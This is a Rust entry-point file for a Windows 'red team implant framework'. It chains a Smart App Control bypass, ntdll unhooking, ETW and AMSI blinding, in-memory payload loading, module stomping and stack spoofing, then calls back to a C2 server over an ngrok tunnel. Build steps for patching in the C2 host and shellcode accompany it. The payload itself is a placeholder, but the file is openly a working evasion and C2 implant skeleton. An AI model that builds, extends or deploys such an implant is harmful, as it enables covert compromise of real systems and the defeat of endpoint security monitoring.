//! redcrab-rt — red team implant framework
//! Build: python builder.py  (recommended — patches C2 details automatically)
//!   OR:  rustup override set nightly && cargo build --release --target x86_64-pc-windows-msvc
//!
//! Per-build checklist:
//!   1. Run builder.py — enter ngrok host, ngrok port, lport, sleep key
//!   2. builder.py patches c2.rs + this file and runs cargo automatically
//!   3. Verify SAC is Off in lab VM before testing

#![no_main]
#![allow(unused_imports, dead_code)]

// ---- module declarations ----------------------------------------------------
mod defs;
mod utils;
mod syscall;
mod loader;
mod stomp;
mod spoof;
mod sleep;
mod etw_patch;
mod unhook;
mod sac_bypass;
mod ppldump;
mod pe_obfuscate;
mod indirect_syscall;
mod threadless_inject;
mod c2;                 // NEW: C2 callback + command loop over ngrok TCP tunnel

use defs::*;
use utils::djb2;

// ---- per-build configuration (patched by builder.py) -----------------------

/// Replace with real shellcode before each engagement.
const PAYLOAD: &[u8] = &[0x90]; // NOP placeholder

/// 16 random bytes — patched by builder.py, regenerate per build.
const SLEEP_KEY: [u8; 16] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

// ---- entry point ------------------------------------------------------------

#[no_mangle]
pub extern "system" fn WinMainCRTStartup() {
    unsafe { run() };
}

unsafe fn run() {
    // 0. SAC bypass
    sac_bypass::bypass_sac();

    // 1. Unhook ntdll
    unhook::unhook_ntdll();

    // 2. ETW + AMSI blind
    etw_patch::apply_all_blinds();

    // 3. XOR-obfuscate payload in memory
    let mut payload_buf = PAYLOAD.to_vec();
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY); // decode

    // 4. Map PE / shellcode
    loader::map_pe(&payload_buf);

    // 5. Post-exec concealment
    let pe_base = 0usize;
    stomp::stomp(0 as _, pe_base as _, payload_buf.len());
    spoof::spoof_stack();

    // Wipe plaintext payload
    pe_obfuscate::secure_zero(&mut payload_buf);

    // 6. C2 callback — connect through ngrok, beacon, run command loop
    //    sleep_mask runs inside the command loop between each beacon check-in
    c2::callback_and_loop();
}
